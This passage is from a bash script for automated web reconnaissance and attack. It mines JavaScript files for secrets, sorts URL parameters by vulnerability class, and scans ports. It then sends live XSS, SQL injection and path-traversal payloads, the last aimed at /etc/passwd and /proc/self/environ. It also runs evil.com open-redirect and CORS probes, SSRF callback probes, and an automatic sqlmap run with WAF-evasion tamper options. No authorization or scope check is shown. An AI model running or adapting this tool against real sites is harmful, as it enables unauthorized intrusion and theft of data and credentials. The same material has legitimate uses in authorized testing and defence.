  if command -v hakrawler &>/dev/null && [[ -f "$live_urls" ]]; then
    ( cat "$live_urls" | hakrawler -depth 3 -subs -js -forms 2>/dev/null \
        | sort -u > "$url_dir/hakrawler.txt" || true
      success "hakrawler: $(count_lines "$url_dir/hakrawler.txt") URLs" ) &
    PID_HK=$!
  fi

  wait $PID_WB $PID_GAU 2>/dev/null || true
  [[ -n "$PID_KT" ]] && wait $PID_KT 2>/dev/null || true
  [[ -n "$PID_GS" ]] && wait $PID_GS 2>/dev/null || true
  [[ -n "$PID_HK" ]] && wait $PID_HK 2>/dev/null || true

  # Merge all URLs + deduplicate with uro
  info "Merging and deduplicating all URLs …"
  cat "$url_dir"/*.txt 2>/dev/null \
    | grep -E "^https?://" \
    | sort -u > "$url_dir/merged_raw.txt"

  if command -v uro &>/dev/null; then
    uro -i "$url_dir/merged_raw.txt" -o "$all_urls" 2>/dev/null \
      && success "After uro dedup: $(count_lines "$all_urls") URLs (from $(count_lines "$url_dir/merged_raw.txt") raw)"
  else
    cp "$url_dir/merged_raw.txt" "$all_urls"
    success "Merged: $(count_lines "$all_urls") URLs"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 4 — JS File Discovery & Endpoint Mining
# ═══════════════════════════════════════════════════════════
phase4_js() {
  phase "PHASE 4 — JS File Discovery & Endpoint Mining"

  if $SKIP_JS; then
    warn "Skipping JS discovery (--skip-js)"
    return 0
  fi

  local js_dir="$OUT/js"
  local live_urls="$OUT/live_urls.txt"
  local all_urls="$OUT/urls/all_urls.txt"

  # 4a. Extract JS URLs from all discovered URLs
  info "Extracting JS file URLs …"
  grep -E "\.js(\?|$|#)" "$all_urls" 2>/dev/null \
    | sort -u > "$js_dir/js_urls.txt" \
    && success "JS files from URLs: $(count_lines "$js_dir/js_urls.txt")"

  # 4b. subjs — finds JS files from live domains
  info "Running subjs on live domains …"
  if command -v subjs &>/dev/null && [[ -f "$live_urls" ]]; then
    cat "$live_urls" \
      | subjs 2>/dev/null \
      | sort -u | anew "$js_dir/js_urls.txt" > /dev/null 2>&1 || true
    success "After subjs: $(count_lines "$js_dir/js_urls.txt") JS files"
  fi

  # 4c. getJS via curl (inline JS link extraction)
  info "Extracting additional JS links via curl + regex …"
  if [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
      curl -sk --max-time "$TIMEOUT" "$url" 2>/dev/null \
        | grep -oP '(?:src|href)=["'"'"'][^"'"'"']*\.js[^"'"'"']*["'"'"']' \
        | grep -oP 'https?://[^"'"'"']+|/[^"'"'"' >]+\.js[^"'"'"' >]*' \
        | sed "s|^/|${url%/*}/|" \
        | grep -v '^/' >> "$js_dir/js_urls.txt" 2>/dev/null || true
    done < <(head -20 "$live_urls")
    sort -u -o "$js_dir/js_urls.txt" "$js_dir/js_urls.txt"
    success "JS file list (final): $(count_lines "$js_dir/js_urls.txt")"
  fi

  # 4d. LinkFinder — extract endpoints from each JS file
  info "Running LinkFinder on JS files …"
  local lf_out="$js_dir/linkfinder_endpoints.txt"
  if [[ -f "$LINKFINDER_DIR/linkfinder.py" ]] && [[ -f "$js_dir/js_urls.txt" ]]; then
    > "$lf_out"
    while IFS= read -r jsurl; do
      "$LINKFINDER_PYTHON" "$LINKFINDER_DIR/linkfinder.py" \
        -i "$jsurl" -o cli 2>/dev/null \
        | grep -E "^/" \
        >> "$lf_out" || true
    done < "$js_dir/js_urls.txt"
    sort -u -o "$lf_out" "$lf_out"
    success "LinkFinder endpoints: $(count_lines "$lf_out")"
  fi

  # 4e. Regex mining from downloaded JS
  info "Mining JS files for secrets & API endpoints via regex …"
  local secrets_out="$js_dir/js_secrets.txt"
  > "$secrets_out"

  SECRET_PATTERNS=(
    "api[_-]?key\s*[=:]\s*['\"][0-9a-zA-Z_\-]{20,}['\"]"
    "secret[_-]?key\s*[=:]\s*['\"][0-9a-zA-Z_\-]{20,}['\"]"
    "access[_-]?token\s*[=:]\s*['\"][0-9a-zA-Z_\-]{20,}['\"]"
    "password\s*[=:]\s*['\"][^'\"]{6,}['\"]"
    "Authorization:\s*Bearer\s+[a-zA-Z0-9._\-]+"
    "AWS_ACCESS_KEY_ID\s*[=:]\s*['\"][A-Z0-9]{20}['\"]"
    "private[_-]key"
    "BEGIN RSA PRIVATE KEY"
    "firebase[a-zA-Z0-9._/\-]*\.json"
    "mongodb\+srv://[^\"' ]+"
    "jdbc:[a-z]+://[^\"' ]+"
  )

  if [[ -f "$js_dir/js_urls.txt" ]]; then
    while IFS= read -r jsurl; do
      content=$(curl -sk --max-time "$TIMEOUT" "$jsurl" 2>/dev/null)
      for pat in "${SECRET_PATTERNS[@]}"; do
        echo "$content" \
          | grep -oiP "$pat" \
          | while read -r match; do
              echo "[SECRET-CANDIDATE] $jsurl  →  $match" >> "$secrets_out"
            done
      done
    done < <(head -50 "$js_dir/js_urls.txt")
    [[ -s "$secrets_out" ]] \
      && warn "Possible secrets found → $secrets_out ($(count_lines "$secrets_out") lines)" \
      || success "No obvious secrets found in JS"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 5 — Parameter URL Extraction & Categorisation
# ═══════════════════════════════════════════════════════════
phase5_params() {
  phase "PHASE 5 — Parameter URL Extraction & Categorisation"
  local all_urls="$OUT/urls/all_urls.txt"
  local param_dir="$OUT/params"

  # All URLs containing ? or =
  info "Extracting parameterized URLs …"
  grep -E "\?.*=" "$all_urls" 2>/dev/null \
    | sort -u > "$param_dir/all_param_urls.txt"
  success "Param URLs (? and =): $(count_lines "$param_dir/all_param_urls.txt")"

  # URLs with only ?
  grep "?" "$all_urls" 2>/dev/null | sort -u > "$param_dir/urls_with_question.txt"
  success "URLs with ?         : $(count_lines "$param_dir/urls_with_question.txt")"

  # URLs with only =
  grep "=" "$all_urls" 2>/dev/null | sort -u > "$param_dir/urls_with_equals.txt"
  success "URLs with =         : $(count_lines "$param_dir/urls_with_equals.txt")"

  # Use gf patterns to sort by vulnerability class
  if command -v gf &>/dev/null && [[ -f "$param_dir/all_param_urls.txt" ]]; then
    info "Sorting param URLs by vuln class using gf …"

    local gf_patterns=(
      "sqli"
      "xss"
      "ssrf"
      "idor"
      "redirect"
      "lfi"
      "rce"
      "ssti"
      "debug_logic"
      "upload-fields"
      "interestingparams"
      "interestingsubs"
    )

    for pattern in "${gf_patterns[@]}"; do
      if gf "$pattern" --list &>/dev/null 2>&1 || \
         [[ -f "$HOME/.gf/${pattern}.json" ]]; then
        gf "$pattern" "$param_dir/all_param_urls.txt" 2>/dev/null \
          | sort -u > "$param_dir/gf_${pattern}.txt"
        count=$(count_lines "$param_dir/gf_${pattern}.txt")
        [[ $count -gt 0 ]] && found "gf_${pattern}.txt: $count URLs"
      fi
    done
  fi

  # Extract unique parameter names
  info "Extracting unique parameter names …"
  grep -oP '[?&][a-zA-Z0-9_\-]+=' "$param_dir/all_param_urls.txt" 2>/dev/null \
    | tr -d '?&=' | sort -u > "$param_dir/unique_param_names.txt"
  success "Unique param names: $(count_lines "$param_dir/unique_param_names.txt")"

  # ── Separate URLs by file extension ───────────────────────────────
  info "Separating URLs by file extension …"
  for ext in php asp aspx jsp cfm cgi pl py rb action do; do
    grep -iE "\\.${ext}(\\?|$|#)" "$all_urls" 2>/dev/null \
      | sort -u > "$param_dir/ext_${ext}.txt"
    count=$(count_lines "$param_dir/ext_${ext}.txt")
    [[ $count -gt 0 ]] && found "ext_${ext}.txt → $count URLs"
  done

  # ── Categorise parameterised URLs by vulnerability hint ───────────
  info "Categorising URLs by vulnerability class hint …"

  # Open Redirect / SSRF
  grep -iE "[?&](url|redirect|next|return|returnto|return_to|goto|dest|destination|redir|redirect_uri|callback|continue|forward|link|src|source|href|ref|referer|location|target|to|from|go|navigate)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_redirect_ssrf.txt"

  # LFI / path traversal
  grep -iE "[?&](file|path|filepath|dir|directory|folder|page|include|require|template|view|load|read|document|root|pg|style|layout|module|conf|config|tpl|tmpl|base|prefix|suffix|type|content|data|resource|func|func_name)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_lfi.txt"

  # IDOR (numeric / object IDs)
  grep -iE "[?&](id|uid|userid|user_id|account|account_id|number|order|order_id|invoice|pid|cid|bid|docid|recid|record|item|object|key|token|ref|reference|uuid|guid|serial|no|num|idx|index)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_idor.txt"

  # SQLi (search / filter / sort params)
  grep -iE "[?&](query|search|q|s|sort|order|by|cat|category|filter|where|limit|offset|num|count|keyword|find|select|from|name|username|email|lang|type)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_sqli.txt"

  # XSS (reflected output params)
  grep -iE "[?&](name|username|title|msg|message|comment|text|body|content|description|data|input|value|field|label|search|q|term|query|error|info|notice|status|type|format|display|show|output|result|feedback|note|subject|reason|detail)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_xss.txt"

  # SSTI / template injection
  grep -iE "[?&](template|theme|layout|lang|locale|format|engine|render|style|view|tpl|tmpl|skin|color|mode|design)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_ssti.txt"

  # Command injection / RCE
  grep -iE "[?&](cmd|command|exec|execute|run|system|shell|ping|host|ip|addr|address|query|payload|code|arg|args|param|params|test|input|debug|eval|expr|op|action)=" \
    "$all_urls" 2>/dev/null | sort -u > "$param_dir/hint_cmdi.txt"

  for hint in redirect_ssrf lfi idor sqli xss ssti cmdi; do
    count=$(count_lines "$param_dir/hint_${hint}.txt")
    [[ $count -gt 0 ]] && found "hint_${hint}.txt → $count URLs"
  done

  # All interesting params in one file
  cat "$param_dir"/hint_*.txt 2>/dev/null | sort -u > "$param_dir/interesting_params.txt"
  success "All interesting-param URLs: $(count_lines "$param_dir/interesting_params.txt")"

  # ── arjun — discover hidden parameters on live endpoints ──────────
  if command -v arjun &>/dev/null && [[ -f "$OUT/live_urls.txt" ]]; then
    info "Running arjun (hidden parameter discovery) …"
    arjun -i "$OUT/live_urls.txt" \
      -oT "$param_dir/arjun_params.txt" \
      -t "$THREADS" \
      --stable 2>"$REDIR" || true
    [[ -s "$param_dir/arjun_params.txt" ]] \
      && found "arjun: $(count_lines "$param_dir/arjun_params.txt") hidden params → $param_dir/arjun_params.txt" \
      || success "arjun: no hidden params found"
  fi

  # ── paramspider — mine params from Wayback for all subdomains ─────
  if command -v paramspider &>/dev/null && [[ -f "$OUT/subdomains/all_subdomains.txt" ]]; then
    info "Running paramspider (Wayback parameter mining) …"
    local ps_out="$param_dir/paramspider"
    mkdir -p "$ps_out"
    while IFS= read -r sub; do
      paramspider -d "$sub" \
        --output "$ps_out/${sub}.txt" 2>"$REDIR" || true
    done < <(head -20 "$OUT/subdomains/all_subdomains.txt")
    cat "$ps_out"/*.txt 2>/dev/null \
      | grep -E "^https?://" \
      | sort -u | anew "$param_dir/all_param_urls.txt" > /dev/null 2>&1 || true
    success "paramspider done — new params merged into all_param_urls.txt"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 6 — Port Scanning
# ═══════════════════════════════════════════════════════════
phase6_ports() {
  phase "PHASE 6 — Port Scanning"

  if $SKIP_HEAVY; then
    warn "Skipping port scan (--skip-heavy)"
    return 0
  fi

  local live_domains="$OUT/live_domains.txt"
  local ports_dir="$OUT/ports"

  # naabu (fast port scanner by ProjectDiscovery)
  if command -v naabu &>/dev/null && [[ -f "$live_domains" ]]; then
    info "Running naabu port scan (top 1000 ports) …"
    naabu -l "$live_domains" \
      -top-ports 1000 \
      -silent \
      -rate 500 \
      -o "$ports_dir/naabu.txt" 2>/dev/null \
      && success "naabu: $(count_lines "$ports_dir/naabu.txt") open ports"
  fi

  # nmap — deeper scan on interesting ports
  if command -v nmap &>/dev/null && [[ -f "$live_domains" ]]; then
    info "Running nmap service/version scan on top 200 ports …"
    nmap -sV -sC \
      --top-ports 200 \
      --open \
      --max-retries 2 \
      --host-timeout 60s \
      -iL "$live_domains" \
      -oN "$ports_dir/nmap.txt" \
      -oX "$ports_dir/nmap.xml" \
      2>/dev/null \
      && success "nmap done → $ports_dir/nmap.txt"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 7 — Directory & File Fuzzing
# ═══════════════════════════════════════════════════════════
phase7_fuzz() {
  phase "PHASE 7 — Directory & File Fuzzing"

  if $SKIP_FUZZ; then
    warn "Skipping fuzzing (--skip-fuzz)"
    return 0
  fi

  local live_urls="$OUT/live_urls.txt"
  local fuzz_dir="$OUT/fuzzing"

  [[ ! -f "$WORDLIST" ]] && \
    WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
  [[ ! -f "$WORDLIST" ]] && \
    WORDLIST="/usr/share/wordlists/dirb/common.txt"
  [[ ! -f "$WORDLIST" ]] && \
    { warn "No wordlist found. Skipping fuzzing. Install seclists: sudo apt install seclists"; return 0; }

  info "Wordlist: $WORDLIST"

  if command -v ffuf &>/dev/null && [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
      hostname=$(echo "$url" | sed 's|https\?://||' | tr '/:' '__')
      info "ffuf on $url …"
      ffuf -u "$url/FUZZ" \
        -w "$WORDLIST" \
        -mc 200,204,301,302,307,401,403,405 \
        -t "$THREADS" \
        -timeout "$TIMEOUT" \
        -of json \
        -o "$fuzz_dir/ffuf_${hostname}.json" \
        -s 2>/dev/null || true
    done < <(head -5 "$live_urls")  # limit to 5 targets
    success "ffuf results in $fuzz_dir/"
  fi
}

# ═══════════════════════════════════════════════════════════
#  PHASE 8 — Vulnerability Scanning
# ═══════════════════════════════════════════════════════════
phase8_vulns() {
  phase "PHASE 8 — Vulnerability Scanning"
  local vuln_dir="$OUT/vulns"
  local live_urls="$OUT/live_urls.txt"
  local param_urls="$OUT/params/all_param_urls.txt"
  local all_urls="$OUT/urls/all_urls.txt"

  # ── 8a. Nuclei (template-based — covers 100s of CVEs + misconfigs) ──
  if command -v nuclei &>/dev/null && [[ -f "$live_urls" ]]; then
    info "Running nuclei (critical/high/medium severity) …"
    nuclei -l "$live_urls" \
      -severity critical,high,medium \
      $SILENT \
      -rate-limit 50 \
      -bulk-size 25 \
      -o "$vuln_dir/nuclei.txt" 2>"$REDIR" \
      && success "nuclei: $(count_lines "$vuln_dir/nuclei.txt") findings"

    # Nuclei: specific template categories
    for tag in cves misconfig exposures takeovers default-logins; do
      info "nuclei [$tag] …"
      nuclei -l "$live_urls" \
        -tags "$tag" $SILENT \
        -rate-limit 30 \
        -o "$vuln_dir/nuclei_${tag}.txt" 2>"$REDIR" || true
    done
  fi

  # ── 8b. XSS — kxss (fast reflection) + dalfox (deep confirmation) ──
  local xss_input="$OUT/params/hint_xss.txt"
  [[ ! -s "$xss_input" ]] && xss_input="$param_urls"

  # kxss — pipe URLs, flag any that reflect dangerous chars
  if command -v kxss &>/dev/null && [[ -s "$xss_input" ]]; then
    info "Running kxss (fast XSS reflection check) …"
    cat "$xss_input" \
      | kxss 2>/dev/null \
      | sort -u > "$vuln_dir/kxss_reflected.txt" || true
    [[ -s "$vuln_dir/kxss_reflected.txt" ]] \
      && found "kxss: $(count_lines "$vuln_dir/kxss_reflected.txt") reflected inputs → $vuln_dir/kxss_reflected.txt" \
      || success "kxss: no dangerous reflections found"
  fi

  # Manual reflection probe — check if input is echoed unencoded
  if [[ -s "$xss_input" ]]; then
    info "Probing XSS with basic reflection payloads …"
    local xss_probe_out="$vuln_dir/xss_reflected_probe.txt"
    > "$xss_probe_out"
    local XSS_MARKER="xsspr0be1337"
    local XSS_PAYLOADS=(
      "<$XSS_MARKER>"
      "\">${XSS_MARKER}<\""
      "'>${XSS_MARKER}<'"
      "<script>${XSS_MARKER}</script>"
      "<img src=x onerror=${XSS_MARKER}>"
      "javascript:${XSS_MARKER}"
    )
    local _xss_total; _xss_total=$(head -100 "$xss_input" | wc -l)
    local _xss_n=0
    while IFS= read -r url; do
      (( _xss_n++ )) || true
      progress "$_xss_n" "$_xss_total" "XSS probe: $url"
      verbose "XSS probe: $url"
      for payload in "${XSS_PAYLOADS[@]}"; do
        rate_wait
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        verbose "  payload: $payload"
        resp=$(curl -sk --max-time "$TIMEOUT" $(curl_auth) "$test_url" 2>/dev/null)
        if echo "$resp" | grep -qF "$XSS_MARKER"; then
          echo "[XSS-REFLECT] payload='$payload' → $test_url" >> "$xss_probe_out"
          found "[XSS-REFLECT] $test_url"
          break
        else
          verbose "  → not reflected"
        fi
      done
    done < <(head -100 "$xss_input")
    echo ""
    [[ -s "$xss_probe_out" ]] \
      && found "XSS reflection hits → $xss_probe_out ($(count_lines "$xss_probe_out"))" \
      || success "No raw XSS reflections found"
  fi

  # dalfox — deep scan with WAF evasion on confirmed reflection hits or full list
  local dalfox_input="$vuln_dir/xss_reflected_probe.txt"
  if [[ ! -s "$dalfox_input" ]]; then dalfox_input="$xss_input"; fi
  if command -v dalfox &>/dev/null && [[ -s "$dalfox_input" ]]; then
    info "Running dalfox (deep XSS) …"
    dalfox file "$dalfox_input" \
      --skip-bav \
      --no-color \
      $($VERBOSE || echo "--silence") \
      --format json \
      -o "$vuln_dir/dalfox_xss.json" 2>/dev/null || true
    # Extract confirmed hits to plain text
    python3 -c "
import json, sys
try:
  data = json.load(open('$vuln_dir/dalfox_xss.json'))
  items = data if isinstance(data, list) else [data]
  for r in items:
    t = r.get('type',''); p = r.get('param',''); poc = r.get('poc', r.get('inject_url',''))
    if t and poc: print(f'[{t}] param={p} → {poc}')
except: pass
" > "$vuln_dir/dalfox_confirmed.txt" 2>/dev/null || true
    [[ -s "$vuln_dir/dalfox_confirmed.txt" ]] \
      && found "dalfox confirmed XSS → $vuln_dir/dalfox_confirmed.txt ($(count_lines "$vuln_dir/dalfox_confirmed.txt"))" \
      || info "dalfox done — raw output: $vuln_dir/dalfox_xss.json"
  fi

  # ── 8c. SQL Injection — error-based auto-probe ──────────────────────
  local sqli_input="$OUT/params/gf_sqli.txt"
  [[ ! -s "$sqli_input" ]] && sqli_input="$OUT/params/hint_sqli.txt"

  if [[ -s "$sqli_input" ]]; then
    cp "$sqli_input" "$vuln_dir/sqli_candidates.txt"
    info "SQLi candidates: $(count_lines "$sqli_input") URLs — probing for errors …"

    local sqli_errors="$vuln_dir/sqli_errors.txt"
    > "$sqli_errors"
    local SQL_PAYLOADS=("'" '"' "1'" "1 OR 1=1--" "' OR '1'='1'--" "1'/*" "\\")
    local SQL_ERR_PAT="mysql_fetch|mysql_num_rows|ORA-[0-9]+|Microsoft OLE DB|Unclosed quotation mark|You have an error in your SQL syntax|SQLSTATE\[|SQLite3::|pg_query\(\)|Warning.*mysql_|syntax error.*near|Incorrect syntax near|unterminated quoted string|supplied argument is not a valid MySQL|Syntax error in string in query expression"

    while IFS= read -r url; do
      verbose "SQLi error probe: $url"
      for payload in "${SQL_PAYLOADS[@]}"; do
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        verbose "  payload: $payload"
        resp=$(curl -sk --max-time "$TIMEOUT" "$test_url" 2>/dev/null)
        if echo "$resp" | grep -qiP "$SQL_ERR_PAT"; then
          echo "[SQLi-ERROR] $test_url" | tee -a "$sqli_errors"
          found "[SQLi-ERROR] $test_url"
          break
        else
          verbose "  → no SQL error"
        fi
      done
    done < <(head -150 "$sqli_input")
    [[ -s "$sqli_errors" ]] \
      && found "Error-based SQLi → $sqli_errors ($(count_lines "$sqli_errors") hits)" \
      || success "No error-based SQLi responses found"

    # Boolean-based blind probe — compare true vs false response lengths
    info "Probing boolean-based blind SQLi (threshold: 200 bytes diff) …"
    local sqli_blind="$vuln_dir/sqli_blind.txt"
    > "$sqli_blind"
    local _sqli_total
    _sqli_total=$(head -50 "$sqli_input" | wc -l)
    local _sqli_n=0
    while IFS= read -r url; do
      (( _sqli_n++ )) || true
      progress "$_sqli_n" "$_sqli_total" "SQLi blind: $url"
      rate_wait
      # Baseline first
      local baseline_len
      baseline_len=$(curl -sk --max-time "$TIMEOUT" $(curl_auth) "$url" 2>/dev/null | wc -c)
      local len_true len_false
      len_true=$(curl -sk --max-time "$TIMEOUT" $(curl_auth) \
        "$(echo "$url" | qsreplace "1 AND 1=1--" 2>/dev/null || echo "$url")" \
        2>/dev/null | wc -c)
      len_false=$(curl -sk --max-time "$TIMEOUT" $(curl_auth) \
        "$(echo "$url" | qsreplace "1 AND 1=2--" 2>/dev/null || echo "$url")" \
        2>/dev/null | wc -c)
      local diff=$(( len_true - len_false ))
      [[ $diff -lt 0 ]] && diff=$(( -diff ))
      local bdiff_t=$(( len_true - baseline_len ))
      local bdiff_f=$(( len_false - baseline_len ))
      [[ $bdiff_t -lt 0 ]] && bdiff_t=$(( -bdiff_t ))
      [[ $bdiff_f -lt 0 ]] && bdiff_f=$(( -bdiff_f ))
      verbose "  → baseline=${baseline_len}b true=${len_true}b false=${len_false}b diff=${diff}b"
      if [[ $diff -gt 200 ]]; then
        echo "[SQLi-BLIND?] diff=${diff}bytes baseline=${baseline_len}b → $url" >> "$sqli_blind"
        warn "[SQLi-BLIND?] response size differs by ${diff}b: $url"
      fi
    done < <(head -50 "$sqli_input")
    echo ""
    [[ -s "$sqli_blind" ]] \
      && found "Possible blind SQLi → $sqli_blind ($(count_lines "$sqli_blind") candidates, verify manually)" \
      || success "No obvious blind SQLi candidates"
  fi

  # ── 8d. SQLmap — auto-run on confirmed/candidate targets ────────────
  if ! $SKIP_HEAVY && command -v sqlmap &>/dev/null; then
    local sqlmap_input="$vuln_dir/sqli_errors.txt"
    # Prefer confirmed error hits; fall back to all candidates
    if [[ ! -s "$sqlmap_input" ]]; then sqlmap_input="$vuln_dir/sqli_candidates.txt"; fi
    if [[ -s "$sqlmap_input" ]]; then
      # Extract just the URLs from lines like "[SQLi-ERROR] http://..."
      grep -oP 'https?://\S+' "$sqlmap_input" 2>/dev/null \
        | sort -u > "$vuln_dir/sqlmap_targets.txt" || \
        cp "$sqlmap_input" "$vuln_dir/sqlmap_targets.txt"
      info "Running sqlmap (batch, level 3, risk 2) on $(count_lines "$vuln_dir/sqlmap_targets.txt") targets …"
      sqlmap -m "$vuln_dir/sqlmap_targets.txt" \
        --batch \
        --level=3 --risk=2 \
        --random-agent \
        --forms \
        --tamper=space2comment,between \
        --output-dir="$vuln_dir/sqlmap" \
        2>/dev/null || true
      success "sqlmap done → $vuln_dir/sqlmap/"
    fi
  fi

  # ── 8e. Open Redirect check ────────────────────────────────────────
  if [[ -f "$OUT/params/gf_redirect.txt" ]] && command -v qsreplace &>/dev/null; then
    info "Checking open redirects …"
    cat "$OUT/params/gf_redirect.txt" \
      | qsreplace "https://evil.com" \
      | xargs -P20 -I{} curl -sk -o /dev/null -w "%{url_effective} %{http_code}\n" \
          --max-time "$TIMEOUT" -L "{}" 2>/dev/null \
      | grep "evil.com" \
      > "$vuln_dir/open_redirects.txt" 2>/dev/null || true
    [[ -s "$vuln_dir/open_redirects.txt" ]] \
      && found "Open redirects → $vuln_dir/open_redirects.txt" \
      || success "No open redirects confirmed"
  fi

  # ── 8f. SSRF probe ─────────────────────────────────────────────────
  if [[ -f "$OUT/params/gf_ssrf.txt" ]] && command -v qsreplace &>/dev/null; then
    info "Checking SSRF candidates …"
    warn "Set SSRF_CALLBACK to your Burp Collaborator / interactsh URL for live detection"
    SSRF_CALLBACK="${SSRF_CALLBACK:-https://ssrf.burpcollaborator.net}"
    cat "$OUT/params/gf_ssrf.txt" \
      | qsreplace "$SSRF_CALLBACK" \
      > "$vuln_dir/ssrf_probes.txt" 2>/dev/null || true
    info "SSRF probe URLs written to $vuln_dir/ssrf_probes.txt"
    info "Send them and check your callback server for DNS/HTTP hits"
  fi

  # ── 8g. Security headers check via curl ────────────────────────────
  info "Checking security headers on live URLs …"
  local headers_out="$vuln_dir/missing_headers.txt"
  > "$headers_out"
  REQUIRED_HEADERS=(
    "Content-Security-Policy"
    "Strict-Transport-Security"
    "X-Frame-Options"
    "X-Content-Type-Options"
    "Referrer-Policy"
    "Permissions-Policy"
  )
  if [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
      headers=$(curl -sk --max-time "$TIMEOUT" -I "$url" 2>/dev/null)
      for h in "${REQUIRED_HEADERS[@]}"; do
        if ! echo "$headers" | grep -qi "$h"; then
          echo "MISSING $h  →  $url" >> "$headers_out"
        fi
      done
    done < "$live_urls"
    [[ -s "$headers_out" ]] \
      && warn "Missing headers → $headers_out ($(count_lines "$headers_out") issues)" \
      || success "All security headers present"
  fi

  # ── 8h. CORS misconfiguration ──────────────────────────────────────
  info "Checking CORS misconfiguration …"
  local cors_out="$vuln_dir/cors.txt"
  > "$cors_out"
  if [[ -f "$live_urls" ]]; then
    while IFS= read -r url; do
      acao=$(curl -sk --max-time "$TIMEOUT" \
        -H "Origin: https://evil.com" -I "$url" 2>/dev/null \
        | grep -i "access-control-allow-origin" | tr -d '\r')
      acac=$(curl -sk --max-time "$TIMEOUT" \
        -H "Origin: https://evil.com" -I "$url" 2>/dev/null \
        | grep -i "access-control-allow-credentials" | tr -d '\r')
      if echo "$acao" | grep -qi "evil.com"; then
        echo "[CORS] Origin reflected: $url  ($acao)" >> "$cors_out"
      fi
      if echo "$acao" | grep -qi "\*" && echo "$acac" | grep -qi "true"; then
        echo "[CORS CRITICAL] ACAO=* + credentials=true: $url" >> "$cors_out"
      fi
    done < "$live_urls"
    [[ -s "$cors_out" ]] \
      && found "CORS issues → $cors_out" \
      || success "No obvious CORS misconfigs"
  fi

  # ── 8i. Sensitive file exposure ─────────────────────────────────────
  info "Probing for sensitive exposed files …"
  local sens_out="$vuln_dir/sensitive_files.txt"
  > "$sens_out"
  SENSITIVE=(
    "/.git/HEAD" "/.git/config" "/.env" "/.env.backup" "/.env.local"
    "/wp-config.php" "/config.php" "/config.js" "/web.config"
    "/phpinfo.php" "/info.php" "/.htaccess" "/.htpasswd"
    "/backup.zip" "/backup.sql" "/db.sql" "/database.sql"
    "/swagger.json" "/swagger.yaml" "/openapi.json" "/api-docs"
    "/graphql" "/graphiql" "/actuator" "/actuator/env" "/actuator/health"
    "/actuator/mappings" "/.DS_Store" "/server-status" "/server-info"
    "/robots.txt" "/sitemap.xml" "/crossdomain.xml" "/clientaccesspolicy.xml"
    "/package.json" "/composer.json" "/Dockerfile" "/docker-compose.yml"
    "/phpmyadmin/" "/adminer.php" "/admin/" "/_debug" "/debug"
  )
  if [[ -f "$OUT/live_domains.txt" ]]; then
    while IFS= read -r domain; do
      for path in "${SENSITIVE[@]}"; do
        url="https://${domain}${path}"
        code=$(curl -sk --max-time "$TIMEOUT" -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        if [[ "$code" == "200" || "$code" == "403" ]]; then
          echo "[$code] $url" >> "$sens_out"
          [[ "$code" == "200" ]] && warn "[$code] $url"
        fi
      done
    done < <(head -5 "$OUT/live_domains.txt")
  fi
  [[ -s "$sens_out" ]] \
    && found "Sensitive files → $sens_out ($(count_lines "$sens_out") hits)" \
    || success "No sensitive files found"

  # ── 8j. Subdomain Takeover ─────────────────────────────────────────
  if command -v nuclei &>/dev/null && [[ -f "$OUT/subdomains/all_subdomains.txt" ]]; then
    info "Checking subdomain takeover …"
    nuclei -l "$OUT/subdomains/all_subdomains.txt" \
      -t "~/nuclei-templates/takeovers/" \
      -silent \
      -o "$vuln_dir/takeovers.txt" 2>/dev/null || true
    [[ -s "$vuln_dir/takeovers.txt" ]] \
      && found "Takeover candidates → $vuln_dir/takeovers.txt" \
      || success "No takeover candidates"
  fi

  # ── 8k. nikto (web server misconfiguration) ────────────────────────
  if command -v nikto &>/dev/null && [[ -f "$OUT/live_domains.txt" ]]; then
    info "Running nikto on first 3 live domains …"
    head -3 "$OUT/live_domains.txt" | while IFS= read -r d; do
      nikto -h "https://$d" -nointeractive \
        -output "$vuln_dir/nikto_${d//./_}.txt" \
        2>/dev/null || true
    done
    success "nikto done"
  fi

  # ── 8l. LFI / Path Traversal — auto-probe ───────────────────────────
  local lfi_input="$OUT/params/gf_lfi.txt"
  [[ ! -s "$lfi_input" ]] && lfi_input="$OUT/params/hint_lfi.txt"

  if [[ -s "$lfi_input" ]]; then
    info "Probing for LFI / path traversal …"
    local lfi_out="$vuln_dir/lfi_hits.txt"
    > "$lfi_out"
    local LFI_PAYLOADS=(
      "../../../etc/passwd"
      "../../../../etc/passwd"
      "../../../../../etc/passwd"
      "....//....//....//etc/passwd"
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      "..%2f..%2f..%2fetc%2fpasswd"
      "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
      "/etc/passwd"
      "php://filter/convert.base64-encode/resource=index"
      "file:///etc/passwd"
      "/proc/self/environ"
      "....\\....\\....\\windows\\win.ini"
      "%2e%2e%5cetc%2fpasswd"
    )
    local LFI_SIG="root:x:0:0|bin:x:|daemon:x:|\\[extensions\\]|for 16-bit app"

    local _lfi_total; _lfi_total=$(head -100 "$lfi_input" | wc -l)
    local _lfi_n=0
    while IFS= read -r url; do
      (( _lfi_n++ )) || true
      progress "$_lfi_n" "$_lfi_total" "LFI probe: $url"
      verbose "LFI probe: $url"
      for payload in "${LFI_PAYLOADS[@]}"; do
        rate_wait
        test_url=$(echo "$url" | qsreplace "$payload" 2>/dev/null || echo "$url")
        verbose "  payload: $payload"
        resp=$(curl -sk --max-time "$TIMEOUT" $(curl_auth) "$test_url" 2>/dev/null)
        if echo "$resp" | grep -qP "$LFI_SIG"; then
          echo "[LFI] payload='$payload' → $test_url" | tee -a "$lfi_out"
          found "[LFI] $test_url"
          break
        else
          verbose "  → no LFI signature in response"
        fi
      done
    done < <(head -100 "$lfi_input")
    echo ""
    [[ -s "$lfi_out" ]] \
